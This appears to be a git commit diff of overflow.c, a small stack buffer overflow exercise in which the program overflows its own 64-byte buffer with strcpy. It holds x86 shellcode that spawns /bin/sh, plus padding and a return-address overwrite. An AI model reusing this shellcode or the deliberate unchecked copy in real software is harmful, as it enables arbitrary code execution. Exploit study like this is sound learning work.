45227905a24769a93ec6f8cad586ffaf9c40400c
cal <callum.adair@outlook.com>
2023-05-02 15:00:23 +0100

    grouping bad things together

--- overflow.c
+++ overflow.c
@@ -3,14 +3,9 @@
 #include <stdint.h>
 #include <stdlib.h>
 
-void overflow(char *input_str) {
-	char buff[64];
-	strcpy(buff, input_str);
-	puts(input_str);
-}
 
 int main(char* argv[], int argc) {
-	//our malicious input will look something like this, containing 56 bad chars, so we need 8 padding chars.
+	//our malicious input will look something like this, containing 56 bad chars, so we need 8 padding chars minus one for the null terminator.
 	char rand_str[] = "aaaabbb"	
 	"\xeb\x24\x5e\x89\x74\x24\x08\x31"
 	"\xc0\x88\x44\x24\x07\x89\x44\x24"
@@ -19,14 +14,15 @@ int main(char* argv[], int argc) {
 	"\xdb\x89\xd8\x40\xcd\x80\xe8\xd7"
 	"\xff\xff\xff"
 	"/bin/sh"
-	"\x6c\x73\x20\x2d\x6c\x61";
-	//add the address of start of shell code here to overwrite the stack pointer
-
-	 uintptr_t diff = (uintptr_t) __builtin_frame_address(0) - (uintptr_t) rand_str;
-	 printf("%u\n", (int) diff);
+	"\x7f\xfc\xf0\x3a\xae\x47";
 	
+	char buff[64];
+	strcpy(buff, rand_str);
+	// "\x6c\x73\x20\x2d\x6c\x61"
+	// uintptr_t diff = (uintptr_t) __builtin_frame_address(0) - (uintptr_t) rand_str;
+	// printf("%u\n", (int) diff);
+	printf("%p\n", buff);
 	// char rand_str[64];
 	// gets(rand_str);
-	overflow(rand_str);
 	return 0;
 }
